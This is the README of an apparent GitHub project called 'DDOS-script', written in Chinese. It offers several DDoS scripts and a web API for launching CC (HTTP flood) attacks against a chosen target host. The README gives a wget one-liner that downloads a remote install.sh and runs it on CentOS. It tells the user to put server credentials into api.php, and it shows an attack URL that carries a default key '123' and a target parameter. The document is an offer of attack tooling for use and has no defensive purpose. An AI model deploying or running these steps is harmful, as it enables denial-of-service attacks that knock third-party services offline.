# DDOS-script
本项目包含了多个DDOS脚本,并可以实现通过API调用实现CC攻击

使用方法:

系统要求:centos6+

运行指令: wget https://raw.githubusercontent.com/jasonBrom/DDOS-script/master/install.sh&&chmod 755 install.sh&&./install.sh

运行完成后 vi /var/www/html/api.php 将文件中的服务器IP用户名和密码,修改成当前服务器密码和用户名

API调用方法:
http://服务IP地址/api.php?key=Key(默认123可自行在api.php中修改)&host=目标地址&method=CC

暂时API仅支持CC攻击(其他脚本可自行下载使用，暂不提供API支持)
